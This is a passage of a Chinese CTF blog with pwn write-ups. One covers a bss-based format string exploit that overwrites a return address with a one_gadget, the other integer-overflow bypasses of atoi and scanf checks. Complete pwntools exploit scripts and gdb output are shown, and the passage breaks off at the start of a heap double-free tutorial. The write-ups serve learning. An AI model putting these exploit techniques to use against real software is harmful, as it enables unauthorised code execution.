<span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;buf) != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"It's time to input something"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buff, <span class="number">0x10</span>u);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buff);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good luck to you!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点很明显就是格式化字符串，N数值为3，所以目前来说只有三次机会，注意buff是在bss段的</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>格式化字符串第一步当然是泄露信息啊</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 25</span><br><span class="line">0000| 0xffb1738c (<span class="string">"!XUV\020pUV\020pUV\020"</span>)</span><br><span class="line">0004| 0xffb17390 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0008| 0xffb17394 --&gt; 0x56557010 (<span class="string">"%22<span class="variable">$x</span>%15<span class="variable">$x</span>\n"</span>)</span><br><span class="line">0012| 0xffb17398 --&gt; 0x10 </span><br><span class="line">0016| 0xffb1739c (<span class="string">"7WUV\374s\360\367\270oUVtt\261\377\001"</span>)</span><br><span class="line">0020| 0xffb173a0 --&gt; 0xf7f073fc --&gt; 0xf7f08980 --&gt; 0x0 </span><br><span class="line">0024| 0xffb173a4 --&gt; 0x56556fb8 --&gt; 0x1ed8 </span><br><span class="line">0028| 0xffb173a8 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0032| 0xffb173ac --&gt; 0x1 </span><br><span class="line">0036| 0xffb173b0 --&gt; 0x1 </span><br><span class="line">0040| 0xffb173b4 --&gt; 0x0 </span><br><span class="line">0044| 0xffb173b8 --&gt; 0xffb10a31 --&gt; 0x0 </span><br><span class="line">0048| 0xffb173bc --&gt; 0x84188400 </span><br><span class="line">0052| 0xffb173c0 --&gt; 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0056| 0xffb173c4 --&gt; 0x0 </span><br><span class="line">0060| 0xffb173c8 --&gt; 0x0 </span><br><span class="line">0064| 0xffb173cc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0068| 0xffb173d0 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0072| 0xffb173d4 --&gt; 0xf7f07000 --&gt; 0x1d6d6c </span><br><span class="line">0076| 0xffb173d8 --&gt; 0x0 </span><br><span class="line">0080| 0xffb173dc --&gt; 0xf7d4e7e1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">0084| 0xffb173e0 --&gt; 0x1 </span><br><span class="line">0088| 0xffb173e4 --&gt; 0xffb17474 --&gt; 0xffb183ba (<span class="string">"./7631454338ff70b1a6b1262f5f36beac"</span>)</span><br><span class="line">0092| 0xffb173e8 --&gt; 0xffb1747c --&gt; 0xffb183dd (<span class="string">"MYVIMRC=/home/NoOne/.vimrc"</span>)</span><br><span class="line">0096| 0xffb173ec --&gt; 0xffb17404 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>第一次格式化字符串我选了两个地方，%22$x%15$x<br>也就是上面的64跟92处，为什么选这两个位置呢？因为第一个，存了libc地址，第二个存了栈地址，并且他还有二级指针指向栈，这是必须的，因为格式化字符串写在了bss段，要在栈里写东西的话，只能通过二级指针，第一步先将这个地址泄露出来，第二步，往这个地址里写东西，因为这个地址本身就是栈里的嘛，所以写进去后，地址就在栈里了，所以就可以跟常规格式化字符串一样利用了</p><p>还有一点，只有三次机会，并且限制了大小，我第一次泄露，第二次写入要写入的地址，第三次写入的时候长度明显不够，所以我需要增大次数，所以要找到变量i或者N的地址，N的地址我是找不到，所以我找了i，他是个有符号数，我把他高位改成0xff，就可以变成负数，经过测试，上述40处为i,80处为返回地址，<br><img src="_v_images/20191029132200484_1723791493.png" alt="返回地址"></p><p>返回地址可以用find找到，找栈里的libc_start_main存在的地方就是ret</p><p>i调试下就出来了，三次会变化的地方</p><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br></pre></td></tr></table></figure><h4 id="地址泄露部分"><a href="#地址泄露部分" class="headerlink" title="地址泄露部分"></a>地址泄露部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 1</span></span><br><span class="line">payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">Input(payload)</span><br><span class="line">stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">__libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">lg(<span class="string">"count"</span>, count)</span><br><span class="line">libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure><h4 id="修改变量i"><a href="#修改变量i" class="headerlink" title="修改变量i"></a>修改变量i</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p>至于偏移为什么是这个，需要你们自己去调试，二级指针那个点位就是那个地方，还有修改后四位够了，栈里的位置，注意，这里是修改的是i的地址+2部分，也就是4个字节的前两个字节部分，修改为0xffff</p><h4 id="修改ret地址"><a href="#修改ret地址" class="headerlink" title="修改ret地址"></a>修改ret地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br></pre></td></tr></table></figure><p>这里先写后两个字节，在写前两个字节，写成one_gadget</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./7631454338ff70b1a6b1262f5f36beac'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Input</span><span class="params">(content)</span>:</span></span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"It's time to input something\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(size1, size2)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size1, <span class="number">21</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;p%&#123;&#125;$hn"</span>.format(size2, <span class="number">57</span>)</span><br><span class="line">    Input(payload)</span><br><span class="line">    payload =<span class="string">"123456781234567"</span></span><br><span class="line">    Input(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#stage 1</span></span><br><span class="line">    payload = <span class="string">"%22$x%15$x"</span></span><br><span class="line">    Input(payload)</span><br><span class="line">    stack_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">    ret = stack_addr - <span class="number">0xa0</span></span><br><span class="line">    count = stack_addr - <span class="number">0xc8</span></span><br><span class="line">    __libc_start_main_addr = int(r(<span class="number">8</span>), <span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">    lg(<span class="string">"stack_addr"</span>, stack_addr)</span><br><span class="line">    lg(<span class="string">"ret_addr"</span>, ret)</span><br><span class="line">    lg(<span class="string">"libc_start_main"</span>, __libc_start_main_addr)</span><br><span class="line">    lg(<span class="string">"count"</span>, count)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    one_gadget = [<span class="number">0x1395ba</span>, <span class="number">0x1395bb</span>]</span><br><span class="line">    one_gadget = libc_base + one_gadget[<span class="number">0</span>]</span><br><span class="line">    lg(<span class="string">"one_gadget"</span>, one_gadget)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; count + <span class="number">2</span>, <span class="number">0xffff</span>)</span><br><span class="line">    write(<span class="number">0xffff</span> &amp; ret, <span class="number">0xffff</span> &amp; one_gadget)</span><br><span class="line">    <span class="comment">#gdb.attach(io, "b printf \n c")</span></span><br><span class="line">    write((<span class="number">0xffff</span>&amp;ret) + <span class="number">2</span>, (<span class="number">0xffff0000</span> &amp; one_gadget)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">"2. Exit\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>这道题看着贼简单，打比赛的时候也不会做，细心想了下，我是傻逼，这道题流程很简单</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init(*&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> ( bypass1() &amp;&amp; bypass2() )</span><br><span class="line">    system(<span class="string">"cat ./flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"failed!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过了两个判断就拿到flag了</p><h3 id="bypass第一个判断"><a href="#bypass第一个判断" class="headerlink" title="bypass第一个判断"></a>bypass第一个判断</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">bypass1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"x: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"y: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(&amp;s, <span class="string">'-'</span>) || <span class="built_in">strchr</span>(&amp;buf, <span class="string">'-'</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x167</span> || v2 &gt; <span class="number">0x167</span> || v1 - v2 != <span class="number">0x168</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"level1 success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着很简单，不能输入负数，然后两个数要求小于167，相减又要等于168，常规思路肯定是不行的，想想<br>-0x1 - (-0x169) = 0x168</p><p>这是我第一次做的时候想到的，然后实际上是误打误撞做出来的，做出来后我发觉那会不理解这道题，就重新理了下思路，发觉还是有可以学习的地方的</p><ol><li><p>程序限制了不能输入负数</p></li><li><p>限制了大小</p></li><li><p>还有注意一点v1跟v2是int 4字节的，atoi转超过int最大的数值的话，会发生截断，只保留后低四个字节的值<br>假设输入的是0x7FFFFFFFF 7个F他只会取到后面的0xFFFFFFFF<br>所以限制输入不能带-号，而实际上内存里存值是只分大小的，所以我存0xFFFFFFFF 按有符号处理的话就是-1</p></li><li><p>s串跟buf串是相邻的，填满了buf的话，会将s里的值也一起传递过来，一起转成数字，就变成一个比较大的数了</p></li></ol><p><strong>坑点: atoi函数遇到\n会停止，没有遇到就继续。。原来我用sendafter一直不行，坑了我好久</strong></p><p>最后我用0x167-(-1)绕过了这个判断<br>就是输入0x167跟0x7FFFFFFFF,绕过这个判断</p><h3 id="bypass第二个判断"><a href="#bypass第二个判断" class="headerlink" title="bypass第二个判断"></a>bypass第二个判断</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_<span class="function">BOOL8 <span class="title">bypass2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input x and y:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d %d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">1</span> &amp;&amp; v2 &gt; <span class="number">360</span> &amp;&amp; v1 * v2 == <span class="number">360</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的话，也是利用溢出绕过,说下怎么求溢出的吧，口算也可以的嘞，不过脚本能跑就不动脑了</p><p>我要达到的数值是<em>00000168，</em>为任意数值，反正后4个字节得是0x168,跑一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(i, <span class="number">0x100000168</span>/float(i))</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="number">1</span>, <span class="number">4294967656.0</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">2147483828.0</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">1431655885.3333333</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="number">1073741914.0</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="number">858993531.2</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="number">715827942.6666666</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="number">613566808.0</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="number">536870957.0</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="number">477218628.4444444</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="number">429496765.6</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="number">390451605.09090906</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="number">357913971.3333333</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="number">330382127.38461536</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="number">306783404.0</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="number">286331177.06666666</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="number">268435478.5</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="number">252645156.2352941</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="number">238609314.2222222</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="number">226050929.2631579</span>)</span><br></pre></td></tr></table></figure><p>我选的要是不带小数的，我看着8吉利就选了他了，<br>所以输入为8跟536870957</p><p>所以最后可以拿到flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Process <span class="string">'./5b7420a5bcdc1da85bccc62dcea4c7b8'</span> stopped with <span class="built_in">exit</span> code 0 (pid 16098)</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">    <span class="string">'cat: ./flag: No such file or directory\n'</span></span><br><span class="line">cat: ./flag: No such file or directory</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'5b7420a5bcdc1da85bccc62dcea4c7b8'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"x: \n"</span>, str(<span class="number">0x167</span>))</span><br><span class="line">    sla(<span class="string">"y: \n"</span>, str(<span class="number">0x7ffffffff</span>))</span><br><span class="line">    <span class="comment">#sl(str(0x7ffffe98) + " " + str(0x7fffffff))</span></span><br><span class="line">    sl(str(<span class="number">0x8</span>) + <span class="string">" "</span> + str(<span class="number">536870957</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学了下非栈里的格式化字符串利用，还有整数溢出部分详细的了解调试了下，希望能学到更多新知识</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3dac6f4c/">https://noone-hub.github.io/posts/3dac6f4c/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程10</title>
    <url>/posts/62c86bb4/</url>
    <content><![CDATA[<h1 id="pwn-heap-learn-10"><a href="#pwn-heap-learn-10" class="headerlink" title="pwn-heap-learn-10"></a>pwn-heap-learn-10</h1><p>本文首发于先知社区</p><p>这个系列完结了吧，入门系列做到这里我感觉已经入门了，后面的就是靠自己去多练习，多学新点了，我这系列最后一篇就发下近期遇到的一些骚操作和新思路吧</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ0OQ==" title="https://xz.aliyun.com/t/6449">pwn堆入门系列教程7<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3Mw==" title="https://xz.aliyun.com/t/6473">pwn堆入门系列教程8<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjU1Ng==" title="https://xz.aliyun.com/t/6556">pwn堆入门系列教程9<i class="fa fa-external-link"></i></span></p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="unctf-Box"><a href="#unctf-Box" class="headerlink" title="unctf Box"></a>unctf Box</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>数组index是可以输入负数的，就是不会利用,后面看了萝卜师傅的wp才知道可以直接改IO_stdout</p><p>我是傻逼！这都想不到</p><p>然后有个double free,新点记录下</p><ul><li>size == 0 ，这个时候等同于free</li><li>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc</li><li>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit</li><li>malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</li></ul><p>所以利用这个点第一次可以用普通的</p><ol><li>free(ptr)</li><li>realloc(ptr,0)</li></ol><p>这就是double free</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>利用IO_stdout泄露libc地址</li><li>利用double free改realloc为one_gadget</li></ol><h4 id="准备工作"><a href="#准备工作" 